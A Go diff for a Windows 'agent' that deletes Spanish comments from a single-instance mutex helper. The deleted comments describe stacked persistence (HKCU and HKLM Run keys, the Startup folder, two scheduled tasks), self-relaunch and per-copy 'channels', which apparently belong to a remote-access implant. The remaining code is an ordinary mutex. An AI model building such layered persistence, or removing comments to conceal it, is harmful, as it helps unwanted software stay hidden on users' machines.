@@ -10,23 +10,10 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// instanceMutex guarda el handle del mutex de instancia única. Vive durante
-// toda la vida del proceso: Windows lo libera solo al terminar.
 var instanceMutex windows.Handle
 
-// ErrAlreadyRunning indica que otra copia del agente ya tiene el mutex.
 var ErrAlreadyRunning = errors.New("win32: ya hay una instancia del agente corriendo")
 
-// AcquireSingleInstance crea un mutex con nombre. Si ya existe, otra copia del
-// agente está viva y esta debe salir sin tocar nada.
-//
-// Las cuatro capas de persistencia (HKCU Run, HKLM Run, carpeta Startup y las
-// dos tareas programadas) disparan a la vez en el logon. Sin este mutex la
-// máquina arranca cinco copias del agente y cada una crea su propio canal.
-//
-// Reintenta durante `wait` porque el proceso padre que relanza la copia
-// instalada sigue con el mutex tomado unos milisegundos: el hijo espera a que
-// lo suelte en vez de rendirse y desaparecer.
 func AcquireSingleInstance(name string, wait time.Duration) error {
 	namePtr, err := windows.UTF16PtrFromString(name)
 	if err != nil {
@@ -60,8 +47,6 @@ func AcquireSingleInstance(name string, wait time.Duration) error {
 	}
 }
 
-// ReleaseSingleInstance suelta el mutex para que el hijo relanzado pueda
-// tomarlo. Se llama justo antes de lanzar la copia instalada.
 func ReleaseSingleInstance() {
 	if instanceMutex == 0 {
 		return
